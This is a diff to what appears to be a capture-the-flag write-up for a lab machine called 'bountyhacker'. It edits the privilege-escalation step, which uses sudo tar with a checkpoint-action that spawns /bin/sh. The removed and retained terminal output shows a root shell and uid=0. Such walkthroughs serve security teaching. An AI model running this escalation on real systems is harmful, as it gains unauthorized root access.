@@ -86,17 +86,7 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 Let's run it :<br>
 ```
-lin@bountyhacker:~/Desktop$     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-tar: Removing leading `/' from member names
-# exit
-exit: not found
-# ^C
-# /bin/bash
-root@bountyhacker:~/Desktop# id
-uid=0(root) gid=0(root) groups=0(root)
-root@bountyhacker:~/Desktop# exit
-exit
-# exit
+
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 # /bin/bash
